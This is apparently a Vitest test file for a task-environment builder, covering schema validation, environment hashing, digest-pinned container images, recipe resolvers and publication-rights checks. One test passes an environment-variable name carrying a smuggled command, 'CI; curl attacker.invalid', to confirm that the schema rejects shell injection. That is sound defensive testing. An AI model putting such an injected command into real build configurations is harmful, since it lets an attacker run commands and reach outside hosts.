// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it } from 'vitest';
import * as environmentContracts from '../../../src/task-creator/environment/contracts.js';
import {
  EnvironmentBuildRecipeV1Schema,
  EnvironmentBuildRequestV1Schema,
  TaskEnvironmentSpecV1Schema,
  hashTaskEnvironmentSpecV1,
} from '../../../src/task-creator/environment/contracts.js';
import {
  EnvironmentRecipeResolverRegistry,
  type EnvironmentRecipeResolver,
} from '../../../src/task-creator/environment/resolver.js';
import {
  JINN_MONO_RECIPE_V1,
  UNJS_DESTR_RECIPE_V1,
  createPresetEnvironmentRecipeResolvers,
} from '../../../src/task-creator/environment/recipes.js';
import { evaluateDefaultRightsPolicy } from '../../../src/task-creator/environment/policy.js';

const SHA_A = `sha256:${'a'.repeat(64)}`;
const SHA_B = `sha256:${'b'.repeat(64)}`;

function request() {
  return {
    schemaVersion: 'jinn.environment-build-request.v1' as const,
    repo: 'Jinn-Network/mono',
    repoUrl: 'https://github.com/Jinn-Network/mono.git',
    baseCommit: 'c'.repeat(40),
    language: 'typescript',
    workspaceHint: 'client',
    testPathHints: ['operator/test/solver-types/example.test.ts'],
    commandHints: ['yarn vitest run operator/test/solver-types/example.test.ts'],
  };
}

function environmentSpec() {
  return {
    schemaVersion: 'jinn.task-environment.v1' as const,
    source: {
      repo: 'Jinn-Network/mono',
      repoUrl: 'https://github.com/Jinn-Network/mono.git',
      baseCommit: 'c'.repeat(40),
    },
    inputs: [{
      inputRef: 'git+https://github.com/Jinn-Network/mono.git#' + 'c'.repeat(40),
      sha256: SHA_A,
      rights: {
        inputRef: 'git+https://github.com/Jinn-Network/mono.git#' + 'c'.repeat(40),
        rightsRef: 'https://github.com/Jinn-Network/mono/blob/main/LICENSE',
        basis: 'spdx' as const,
        spdxId: 'Apache-2.0',
      },
    }],
    execution: {
      platform: 'linux/amd64' as const,
      workspace: '/testbed',
      image: {
        reference: `ghcr.io/jinn-network/task-environment/jinn-mono@${SHA_B}`,
        digest: SHA_B,
      },
      testCommands: [{
        bin: 'yarn',
        args: ['vitest', 'run', '--reporter=json'],
        cwd: 'client',
      }],
      parser: {
        id: 'vitest-json.v1',
        version: 'v1',
        digest: SHA_A,
        bundleId: 'jinn.swe-rebench-v2.patch-bundle.v1',
      },
      timeoutSeconds: 300,
      environment: { CI: '1' },
    },
    build: {
      recipeCid: 'bafyrecipe',
      recipeHash: SHA_A,
      provider: 'explicit' as const,
      providerId: 'jinn-mono.v1',
      providerVersion: 'v1',
    },
    publication: {
      publicRepoVerifiedAt: '2026-07-10T10:00:00.000Z',
      rightsPolicyVersion: 'jinn.publication-rights.v1',
      buildSmoke: 'pass' as const,
      imageSecretScan: 'pass' as const,
      sbomCid: 'bafysbom',
    },
    attestation: {
      scheme: 'eip191' as const,
      algo: 'secp256k1' as const,
      environmentHash: SHA_A,
      operatorSafe: '0x1111111111111111111111111111111111111111',
      signer: '0x2222222222222222222222222222222222222222',
      signature: `0x${'3'.repeat(130)}`,
    },
  };
}

function withExpectedEnvironmentHash(spec: ReturnType<typeof environmentSpec>) {
  return {
    ...spec,
    attestation: {
      ...spec.attestation,
      environmentHash: hashTaskEnvironmentSpecV1(spec),
    },
  };
}

function verifiedInputs(
  rights: ReadonlyArray<{ inputRef: string; rightsRef: string }>,
  visibility: 'public' | 'private',
  licenseSpdxId: string | null,
) {
  return Object.fromEntries(rights.map((right) => [right.inputRef, {
    inputRef: right.inputRef,
    locator: `fixture:${right.inputRef}`,
    visibility,
    licenseSpdxId,
    evidenceRef: right.rightsRef,
  }]));
}

describe('environment contracts', () => {
  it.each(['fixCommit', 'goldPatch', 'testPatch', 'testPatchContent'])(
    'rejects forbidden gold-bearing build request key %s',
    (forbiddenKey) => {
      expect(() => EnvironmentBuildRequestV1Schema.parse({
        ...request(),
        [forbiddenKey]: 'must never reach the builder',
      })).toThrow();
    },
  );

  it('hashes only immutable environment bindings', () => {
    const spec = TaskEnvironmentSpecV1Schema.parse(withExpectedEnvironmentHash(environmentSpec()));
    const changedObservations = TaskEnvironmentSpecV1Schema.parse(withExpectedEnvironmentHash({
      ...environmentSpec(),
      publication: { ...environmentSpec().publication, publicRepoVerifiedAt: '2026-07-11T10:00:00.000Z' },
      attestation: { ...environmentSpec().attestation, signature: `0x${'4'.repeat(130)}` },
    }));
    const changedExecution = TaskEnvironmentSpecV1Schema.parse(withExpectedEnvironmentHash({
      ...environmentSpec(),
      execution: { ...environmentSpec().execution, timeoutSeconds: 301 },
    }));

    expect(hashTaskEnvironmentSpecV1(spec)).toBe(hashTaskEnvironmentSpecV1(changedObservations));
    expect(hashTaskEnvironmentSpecV1(spec)).not.toBe(hashTaskEnvironmentSpecV1(changedExecution));
  });

  it('rejects an attestation that does not bind the canonical environment hash', () => {
    const parser = (environmentContracts as Record<string, unknown>)['parseTaskEnvironmentSpecV1'];
    expect(parser).toBeTypeOf('function');
    if (typeof parser !== 'function') return;
    const valid = withExpectedEnvironmentHash(environmentSpec());

    expect(() => parser({
      ...valid,
      attestation: { ...valid.attestation, environmentHash: SHA_A },
    })).toThrow(/attestation\.environmentHash/i);
  });

  it('rejects mutable or mismatched OCI image references', async () => {
    const registry = new EnvironmentRecipeResolverRegistry(createPresetEnvironmentRecipeResolvers());
    const resolved = await registry.resolve(request());
    if (resolved.kind !== 'resolved') throw new Error('expected Jinn preset to resolve');

    expect(() => EnvironmentBuildRecipeV1Schema.parse({
      ...resolved.recipe,
      baseImage: { ...resolved.recipe.baseImage, reference: 'node:latest' },
    })).toThrow(/digest-qualified/i);
    const invalidExecutionImage = withExpectedEnvironmentHash({
      ...environmentSpec(),
      execution: {
        ...environmentSpec().execution,
        image: {
          reference: `ghcr.io/jinn-network/task-environment/jinn-mono@${SHA_A}`,
          digest: SHA_B,
        },
      },
    });
    expect(() => TaskEnvironmentSpecV1Schema.parse(invalidExecutionImage)).toThrow(/digest-qualified/i);
  });

  it('rejects a shell-injectable environment-variable name in a structured command', () => {
    expect(() => EnvironmentBuildRecipeV1Schema.parse({
      ...JINN_MONO_RECIPE_V1,
      installCommands: [{
        ...JINN_MONO_RECIPE_V1.installCommands[0]!,
        environment: { 'CI; curl attacker.invalid': '1' },
      }],
    })).toThrow(/shell environment variable name/i);
  });
});

describe('environment recipe resolver registry', () => {
  it('does not fall through after a claiming resolver returns a malformed recipe', async () => {
    const first: EnvironmentRecipeResolver = {
      id: 'configured-first',
      version: 'v1',
      async supports() { return { supported: true, confidence: 'explicit' }; },
      async resolve() { return { not: 'an environment recipe' }; },
    };
    const fallback: EnvironmentRecipeResolver = {
      id: 'fallback',
      version: 'v1',
      async supports() { return { supported: true, confidence: 'deterministic' }; },
      async resolve() { return JINN_MONO_RECIPE_V1; },
    };

    const result = await new EnvironmentRecipeResolverRegistry([first, fallback]).resolve(request());

    expect(result).toMatchObject({ kind: 'terminal_error', resolverId: 'configured-first' });
  });

  it('returns awaiting_input only when no resolver claims the request', async () => {
    const result = await new EnvironmentRecipeResolverRegistry([]).resolve(request());

    expect(result).toEqual({ kind: 'awaiting_input', reason: 'no-supported-environment-recipe' });
  });
});

describe('publication policy and presets', () => {
  it('allows public MIT/Apache source evidence but rejects missing rights', () => {
    const apache = evaluateDefaultRightsPolicy({
      repository: { visibility: 'public', licenseSpdxId: 'Apache-2.0' },
      inputRights: JINN_MONO_RECIPE_V1.inputRights,
      verifiedInputs: verifiedInputs(JINN_MONO_RECIPE_V1.inputRights, 'public', 'Apache-2.0'),
    });
    const mit = evaluateDefaultRightsPolicy({
      repository: { visibility: 'public', licenseSpdxId: 'MIT' },
      inputRights: UNJS_DESTR_RECIPE_V1.inputRights,
      verifiedInputs: verifiedInputs(UNJS_DESTR_RECIPE_V1.inputRights, 'public', 'MIT'),
    });
    const missingRights = [{
      inputRef: 'git+https://github.com/acme/private.git#' + 'd'.repeat(40),
      rightsRef: 'https://github.com/acme/private',
      basis: 'spdx' as const,
      spdxId: 'NOASSERTION',
    }];
    const missing = evaluateDefaultRightsPolicy({
      repository: { visibility: 'public', licenseSpdxId: null },
      inputRights: missingRights,
      verifiedInputs: verifiedInputs(missingRights, 'public', null),
    });

    expect(apache).toEqual({ allowed: true });
    expect(mit).toEqual({ allowed: true });
    expect(missing).toMatchObject({ allowed: false, code: 'missing-or-unapproved-rights' });
  });

  it('requires a publication-rights basis for every disclosed input', () => {
    const decision = evaluateDefaultRightsPolicy({
      repository: { visibility: 'public', licenseSpdxId: 'Apache-2.0' },
      inputRights: [
        ...JINN_MONO_RECIPE_V1.inputRights,
        {
          inputRef: 'oci://example.invalid/unreviewed@sha256:' + 'e'.repeat(64),
          rightsRef: 'https://example.invalid/no-rights',
          basis: 'spdx',
          spdxId: 'NOASSERTION',
        },
        {
          inputRef: 'oci://example.invalid/authorized@sha256:' + 'f'.repeat(64),
          rightsRef: 'https://example.invalid/authorization',
          basis: 'authorization',
          authorizationRef: 'https://example.invalid/authorization',
        },
      ],
      verifiedInputs: {
        ...verifiedInputs(JINN_MONO_RECIPE_V1.inputRights, 'public', 'Apache-2.0'),
        ['oci://example.invalid/unreviewed@sha256:' + 'e'.repeat(64)]: {
          inputRef: 'oci://example.invalid/unreviewed@sha256:' + 'e'.repeat(64),
          locator: 'fixture:unreviewed',
          visibility: 'public',
          licenseSpdxId: 'NOASSERTION',
          evidenceRef: 'https://example.invalid/no-rights',
        },
        ['oci://example.invalid/authorized@sha256:' + 'f'.repeat(64)]: {
          inputRef: 'oci://example.invalid/authorized@sha256:' + 'f'.repeat(64),
          locator: 'fixture:authorized',
          visibility: 'public',
          licenseSpdxId: null,
          evidenceRef: 'https://example.invalid/authorization',
        },
      },
    });

    expect(decision).toMatchObject({ allowed: false, code: 'missing-or-unapproved-rights' });
  });

  it('does not let a public Apache repository authorize a separate private input locator', () => {
    const publicInput = {
      inputRef: 'git+https://github.com/public/apache.git#' + 'a'.repeat(40),
      rightsRef: 'https://evidence.example/public',
      basis: 'spdx' as const,
      spdxId: 'Apache-2.0',
    };
    const privateInput = {
      inputRef: 'git+https://github.com/private/apache.git#' + 'b'.repeat(40),
      rightsRef: 'https://evidence.example/private',
      basis: 'spdx' as const,
      spdxId: 'Apache-2.0',
    };
    const decision = evaluateDefaultRightsPolicy({
      repository: { visibility: 'public', licenseSpdxId: 'Apache-2.0' },
      inputRights: [publicInput, privateInput],
      verifiedInputs: {
        ...verifiedInputs([publicInput], 'public', 'Apache-2.0'),
        ...verifiedInputs([privateInput], 'private', 'Apache-2.0'),
      },
    });

    expect(decision).toMatchObject({ allowed: false, code: 'input-not-public' });
  });

  it('requires authorization evidence to bind both declared authorization references', () => {
    const authorizedInput = {
      inputRef: 'git+https://github.com/public/authorized.git#' + 'c'.repeat(40),
      rightsRef: 'https://evidence.example/declared-rights',
      basis: 'authorization' as const,
      authorizationRef: 'https://evidence.example/declared-authorization',
    };
    const decision = evaluateDefaultRightsPolicy({
      inputRights: [authorizedInput],
      verifiedInputs: {
        [authorizedInput.inputRef]: {
          inputRef: authorizedInput.inputRef,
          locator: 'fixture:authorized',
          visibility: 'public',
          licenseSpdxId: null,
          evidenceRef: 'https://evidence.example/unrelated-rights',
        },
      },
    });

    expect(decision).toMatchObject({ allowed: false, code: 'missing-or-unapproved-rights' });
  });

  it('ships exact digest-pinned Linux/amd64 presets that use the trusted Vitest parser', async () => {
    expect(JINN_MONO_RECIPE_V1).toMatchObject({
      recipeId: 'jinn-mono.v1',
      platform: 'linux/amd64',
      workspace: '/testbed',
      baseImage: {
        reference: 'node:22-bookworm-slim@sha256:53ada149d435c38b14476cb57e4a7da73c15595aba79bd6971b547ceb6d018bf',
        digest: 'sha256:53ada149d435c38b14476cb57e4a7da73c15595aba79bd6971b547ceb6d018bf',
      },
      parser: { id: 'vitest-json.v1' },
    });
    expect(UNJS_DESTR_RECIPE_V1).toMatchObject({
      recipeId: 'unjs-destr.v1',
      platform: 'linux/amd64',
      workspace: '/testbed',
      baseImage: {
        reference: 'node:20-bookworm-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0',
        digest: 'sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0',
      },
      parser: { id: 'vitest-json.v1' },
    });
    expect(JINN_MONO_RECIPE_V1.installCommands.slice(0, 3)).toEqual([
      { bin: 'apt-get', args: ['update'] },
      { bin: 'apt-get', args: ['install', '-y', '--no-install-recommends', 'python3', 'make', 'g++'] },
      { bin: 'corepack', args: ['enable'] },
    ]);
    expect(JINN_MONO_RECIPE_V1.installCommands).not.toHaveLength(0);
    expect(JINN_MONO_RECIPE_V1.smokeCommands).not.toHaveLength(0);
    expect(JINN_MONO_RECIPE_V1.testCommands).not.toHaveLength(0);
    expect(UNJS_DESTR_RECIPE_V1.installCommands).not.toHaveLength(0);
    expect(UNJS_DESTR_RECIPE_V1.smokeCommands).not.toHaveLength(0);
    expect(UNJS_DESTR_RECIPE_V1.testCommands).not.toHaveLength(0);

    const registry = new EnvironmentRecipeResolverRegistry(createPresetEnvironmentRecipeResolvers());
    const result = await registry.resolve({
      ...request(),
      repo: 'unjs/destr',
      repoUrl: 'https://github.com/unjs/destr.git',
      baseCommit: 'd'.repeat(40),
    });
    expect(result).toMatchObject({ kind: 'resolved', recipe: { recipeId: 'unjs-destr.v1' } });
  });
});
